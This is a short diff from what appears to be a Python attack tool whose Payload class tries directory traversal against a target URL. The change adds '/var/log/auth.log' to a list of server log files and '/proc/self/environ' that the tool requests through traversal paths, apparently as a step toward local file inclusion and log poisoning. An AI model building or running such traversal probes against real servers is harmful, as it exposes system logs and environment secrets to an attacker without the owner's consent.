@@ -221,7 +221,7 @@ class Payload:
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
 			# Apache logs
-			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
+			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ"), quote("/var/log/auth.log")]
 			for d_path in self.linux_dirTraversal:
 				for l_path in logPath:
 					pathth = self.url + d_path + l_path
